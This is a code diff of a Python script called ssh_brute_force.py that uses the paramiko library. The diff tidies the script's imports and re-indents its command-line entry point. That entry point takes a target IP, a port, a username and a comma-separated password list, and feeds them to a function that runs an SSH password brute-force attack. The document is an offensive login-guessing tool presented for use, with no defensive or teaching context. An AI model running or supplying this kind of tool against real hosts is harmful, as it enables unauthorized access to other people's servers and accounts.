@@ -1,4 +1,4 @@
-import paramiko, sys, os, socket
+import paramiko, sys, socket
 
 def ssh_connect(username, password, host, port, code=0):
     ssh = paramiko.SSHClient()
@@ -34,16 +34,13 @@ def start_ssh_brute_force_attack(username, targetIP, targetPort, passwords):
             pass
 
 if __name__ == '__main__':
-  username = "ubuntu"
-  password_file = os.path.join(sys.path[0], "passwords.txt")
-  # attackID, iface, targetIP, targetPort=None
-  argv_len = len(sys.argv)
-  if  argv_len < 5:
-    print("Invalid input arguments")
-    print("python ssh_brute_force.py <targetIP> <targetPort> <username> <password1[,password2,password3]>")
-  else:
-    host = sys.argv[1]
-    port = sys.argv[2]
-    username = sys.argv[3]
-    passwords = sys.argv[4].split(',')
-    start_ssh_brute_force_attack(username,host,port, passwords)
+    argv_len = len(sys.argv)
+    if  argv_len < 5:
+        print("Invalid input arguments")
+        print("python ssh_brute_force.py <targetIP> <targetPort> <username> <password1[,password2,password3]>")
+    else:
+        host = sys.argv[1]
+        port = sys.argv[2]
+        username = sys.argv[3]
+        passwords = sys.argv[4].split(',')
+        start_ssh_brute_force_attack(username,host,port, passwords)
